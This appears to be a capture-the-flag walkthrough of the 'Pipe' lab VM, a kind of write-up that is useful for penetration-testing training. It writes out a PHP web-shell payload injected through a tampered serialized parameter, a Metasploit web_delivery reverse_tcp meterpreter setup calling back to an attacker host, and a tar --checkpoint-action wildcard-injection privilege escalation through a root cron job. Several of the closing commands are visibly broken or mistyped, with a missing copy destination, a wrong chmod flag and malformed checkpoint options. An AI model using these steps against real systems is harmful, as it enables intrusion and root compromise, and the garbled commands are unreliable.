@@ -1,0 +1,85 @@
+
+Hack the Pipe VM (CTF Challenge)
+
+PIPE is another CTF which gives you a platform to enhance your penetration testing skills. So let’s not waste any more time and get started with it.
+First of all download pipe lab from here
+Like always our first step would be to run netdiscover command to see the active hosts in our network.
+netdiscover 
+Target IP: 192.168.0.103
+
+As we have target IP so we will do nmap scan to see if there are any ports active for further penetration.
+nmap –p- -A 192.168.0.103
+And from here we get open ports 22, 80, 111, 54073.
+
+Now we will open target IP in browser as port 80 is active. Here the website reflects off unauthorized message with a login page. On login window it written “the site says: index.php” which we will be using later on.
+
+Now using burpsuite we are going to capture the cookies for login page by setting manual proxy of firefox browser. It has intercepted data for login page. Changes are to be made in GET parameter in to get authentication.
+HACK / index.php 
+
+After this step, forward request to the browser for execution of process and finally getting into website. Ok! To above step leads us to website which shows a PIPE picture and a link below it to get artist info.
+
+As we cannot see anything else on this web page so right click anywhere on page and choose view page source. It shows an accessible directory scriptz in its script content.
+
+Now open target ip with scriptz in browser.
+192.168.0.103/scriptz/
+Oh! Look at that we found an accessible directory.
+
+We will first open log.php.BAK file and see if we get some information to go further or not. And see what it shows. It seems that this file will write itself on the webroot directory. This is very interesting to us especially if we can control the data field supplied to the file.
+cat log.php.bak
+
+Now again returning to our original web page and simultaneously start burp suite by setting manual proxy for it. Click on the link given below image and capture cookies that request in burp.
+
+Here we have the intercepted data in burp window which shows the parameter used for above web page.
+
+After above step right click on this window and list of some options will appear choose sent to repeater and as a result 2 windows will get opened one for request and one for response.
+
+Select the parameter in request tab and send it for decoding in smart decoder. This can be done by right clicking on selected text and then sending it to decoder. Now select decoder tab from above menu and choose smart decoder from left side menu. In the image below red highlighted text is decoded and result is shown in below window the code which is given in bottom window need to be altered so that we can upload our malicious code.
+
+Now going back to our intercept window we see that our earlier parameter is decoded where we can make changes according to our requirements. So the changes are as follows.
+0:4->0:3, Info->log, s->8, id->filename, s->31
+Then give the path of file i.e. /var/www/html/scriptz/shell.php
+s->4, rene->data, s->60
+and then code which is to be executed i.e. <?php echo ‘<pre>’ ; system($_GET[‘cmd’]) ; echo ‘</pre>’;?>”;)
+Now forward the request to browser.
+
+Great our shell.php file is uploaded in that accessible directory.
+
+Now we have uploaded shell it’s time to open it see what it gives us. As we have executed the code for cmd, we will type cmd in URL as well.
+cmd=id
+It shows the following data in the command we executed.
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+That’s the game! It’s time to exploit through shell that we have uploaded in accessible directory.
+Now open terminal in kali Linux and proceed to Metasploit by typing msfconsole.
+Thereafter find the exploits for search web_delivery and use the exploit followed by set target, payload, lhost, lport and run exploit.
+Use exploit/multi/script/web_delivery
+Show targets
+Set target 2
+Set lhost 192.168.0.104
+Set lport 4444
+Set payload php/meterpreter/reverse_tcp
+run
+At last when all the commands are executed, it will provide a code at the bottom of image.
+
+Now again copy the code which we get as a result and paste it in URL after cmd and execute it.
+
+As soon as we execute the code in URL we will get meterpreter session of our target i.e. PIPE
+Now we will go to shell by typing
+Shell
+echo “import pty; pty.spawn(‘/bin/bash’)” > /tmp/asdf.py
+python /tmp/asdf.py
+Our next step is to find the kernel version of Ubuntu. TO know the said type: lsb_release -a
+
+We check for any cronjobs running on the system via cat /etc/crontab we can see a couple of cron jobs running which interest us.
+In /etc/crontab the script /usr/bin/compress.sh which is world readable now follow the following steps
+
+Now time to do some magic follow the following steps
+Cd /home/rene/backup
+Echo ‘cp /root/flag.txt;chmod –r /tmp/flag.txt’ > flag.sh
+Touch /home/rene/backup/–checkpoint=1
+Touch /home/rene/backup/–checkpoint=-action=exec=sh\ flag.sh
+Cd /tmp
+
+At last open this flag.txt file and we have our flag. Mission accomplished!
+
+Author: Shailesh Kumar is a passionate Researcher and Technical Writer at Hacking Articles. he is a hacking enthusiast.
